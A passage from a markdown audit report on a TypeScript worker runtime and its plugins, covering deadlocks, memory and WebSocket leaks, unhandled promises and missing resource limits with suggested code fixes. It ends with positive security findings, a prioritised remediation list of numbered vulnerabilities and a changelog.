**Fix:** Add overall timeout wrapper (60s recommended).

---

### 3. Worker Pool Deadlock Under High Load

**Status:** [ ] Not started
**Severity:** High
**File:** `runtime/src/libs/pool/pool.ts`
**Lines:** 80-139

**Description:** No queuing or backpressure mechanism. When pool reaches `maxSize`, LRU cache evicts workers synchronously during `cache.set()`. Worker termination is async, causing cascading failures under burst traffic.

**Impact:** Request latency spikes dramatically, memory can grow unbounded.

**Fix:** Add request queue with limit and backpressure:
```typescript
private requestQueue: Array<() => void> = [];
private MAX_QUEUE_SIZE = 1000;

async fetch(...) {
  if (this.requestQueue.length >= MAX_QUEUE_SIZE) {
    throw new Error('Worker pool overloaded');
  }
  // ... add queuing logic
}
```

---

### 4. Unhandled Promise Rejection in Queue Listener

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-keyval/server/lib/queue.ts`
**Lines:** 455-482

**Description:** The `listen()` method spawns an async `work()` function but doesn't await it or handle its rejection.

```typescript
const work = async () => {
  while (state.running) {
    // ... async operations that can throw
  }
};

work();  // Floating promise - unhandled rejection possible
```

**Impact:** Unhandled promise rejection could crash the process.

**Fix:**
```typescript
work().catch((err) => {
  this.kv.getLogger()?.error("Queue worker crashed", { error: err });
});
```

---

### 5. Memory Leak - Gateway Rate Limiter

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-gateway/server/rate-limit.ts`
**Lines:** 66-95

**Description:** `TokenBucket` instances are created for every unique key (IP/user) and stored in a `Map` with no maximum size limit. Cleanup only removes full buckets.

**Impact:** Under high traffic with many unique IPs, Map grows indefinitely causing OOM.

**Fix:** Implement LRU cache with max size (similar to `DatabaseServiceImpl`'s use of `QuickLRU`).

---

### 6. Memory Leak - Gateway Response Cache

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-gateway/server/cache.ts`
**Lines:** 16-107

**Description:** Cache has `maxEntries` limit but uses naive FIFO eviction that only removes ONE entry when at capacity.

**Impact:** Cache grows beyond limit, storing full response bodies in memory.

**Fix:** Use LRU cache library or enforce strict size limit in a loop.

---

### 7. WebSocket Connection Leak - Proxy Plugin

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/services.ts`
**Lines:** 292-326

**Description:** WebSocket proxy creates target WebSocket but doesn't clean it up if connection fails after constructor.

```typescript
const target = new WebSocket(wsUrl);
target.onopen = () => {
  ws.data.target = target;  // Only stored on successful open
};
target.onerror = (error) => {
  ws.close(1011, "Target connection error");  // Doesn't close target
};
```

**Impact:** WebSocket connections to target servers remain open after client disconnect, leaking file descriptors.

**Fix:** Store target reference immediately and ensure cleanup in all paths.

---

### 8. Worker Timeout Leaves Persistent Workers in Bad State

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/instance.ts`
**Lines:** 192-195

**Description:** When a worker request times out, cleanup removes event listeners but doesn't terminate persistent workers (ttl > 0). The worker continues processing and eventually responds, but the response is lost.

**Impact:** Future requests to the same worker may fail unpredictably.

**Fix:** Mark worker as unhealthy on timeout:
```typescript
const timeout = setTimeout(() => {
  this.hasCriticalError = true;
  cleanup();
  reject(new Error(`Worker timeout after ${this.config.timeoutMs}ms`));
}, this.config.timeoutMs);
```

---

### 9. Race Condition in Message Handler Cleanup

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/instance.ts`
**Lines:** 185-190

**Description:** Cleanup function removes event listeners but doesn't prevent late messages from being processed.

**Impact:** Double response resolution, use-after-free style bugs with terminated workers.

**Fix:** Add `completed` flag check in handler before processing.

---

### 10. No Resource Limits on Worker Threads

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/instance.ts`
**Lines:** 84-95

**Description:** Workers created without resource limits (CPU, memory, disk I/O).

**Impact:** One malicious worker can DoS the entire runtime with infinite loops or memory exhaustion.

**Fix:** Implement timeout-based termination with resource monitoring.

---

## Runtime Security Notes

### Positive Security Findings

The codebase demonstrates good security practices in several areas:

1. **Parameterized SQL queries** - Most database queries use placeholders
2. **CSRF protection** - Origin header validation for state-changing requests (`app.ts:418-446`)
3. **Body size limits** - Prevents DoS via large uploads (`request.ts:25-53`)
4. **Path traversal protection** - `isPathSafe()` validation in some areas
5. **Bcrypt for key hashing** - Proper password hashing with configurable cost factor
6. **Audit logging** - Comprehensive logging of sensitive operations
7. **Permission-based access control** - Hierarchical role system with granular permissions

### Areas Needing Improvement

1. **No global rate limiting** on `/api/*` endpoints
2. **Missing CORS configuration** (may be intentional for same-origin only)
3. **No CSP headers** (may be handled by reverse proxy)
4. **Plugin config endpoints** may expose secrets to `config:read` role
5. **No inter-worker isolation at OS level** - Workers run in same process

---

## Remediation Priority

### Immediate (Critical)
1. Fix SQL injection vulnerabilities (#1, #2, #3, #5)
2. Fix tenant isolation bypass (#4)
3. Fix timing attacks (#6, #7)
4. Replace Math.random() with crypto.getRandomValues() (#8)
5. Add authentication to sensitive endpoints (#15)
6. Add timeouts to startup sequence (Availability #1, #2)
7. Fix SSRF in proxy plugin (#31)
8. Fix header injection in proxy (#32)
9. Fix path traversal in file upload (#33)
10. Fix Zip slip vulnerability (#34)
11. Fix plaintext token storage in CLI (#45)
12. Fix path traversal in static handler (#46)
13. Add authentication to metrics plugin (#47)

### Short-term (High)
14. Fix ReDoS vulnerabilities (#9, #10, #11, #50)
15. Fix SSRF/path traversal (#12, #16, #17)
16. Fix IP spoofing bypass (#13)
17. Fix open redirect (#14)
18. Fix cache poisoning (#18)
19. Fix transaction race conditions (#19)
20. Validate OIDC discovery documents (#20)
21. Implement worker pool backpressure (Availability #3)
22. Fix HTML injection via base tag (#35)
23. Add proxy API authentication (#36)
24. Fix WebSocket resource exhaustion (#37)
25. Fix environment variable exposure (#38)
26. Fix symlink following in downloads (#39)
27. Add rate limiting to key creation (#41)
28. Add Host header validation (#42)
29. Remove CLI token argument exposure (#48)
30. Fix global TLS bypass in CLI (#49)
31. Fix worker stats information disclosure (#51)
32. Fix metrics SSE DoS vulnerability (#52)

### Medium-term
33. Fix CIDR matching (#22)
34. Increase key prefix length (#23)
35. Add rate limiting to API key validation (#24)
36. Add audit log integrity protection (#25)
37. Remove worker ID exposure (#26)
38. Disable auto-install in production (#27)
39. Improve env var filtering (#28)
40. Add watch/SSE limits (#29)
41. Add value size limits (#30)
42. Fix memory leaks (Availability #5, #6)
43. Fix WebSocket cleanup (Availability #7)
44. Implement global rate limiting
45. Fix TOCTOU race condition (#40)
46. Add safe JSON parsing (#43)
47. Add plugin name validation (#44)
48. Fix URL injection in keyval client (#53)
49. Harden CLI database file permissions (#54)
50. Add JSON payload validation to keyval client (#55)

---

## Changelog

| Date | Author | Changes |
|------|--------|---------|
| 2026-01-12 | Security Audit | Initial vulnerability assessment |
| 2026-01-12 | Security Audit (Deep Dive) | Added 22 new vulnerabilities from deep-dive analysis |
| 2026-01-12 | Security Audit (Iteration 3) | Added proxy, deployments, and runtime request handling findings |
| 2026-01-12 | Security Audit (Iteration 4) | Added CLI, shared utils, keyval client, and metrics plugin findings |
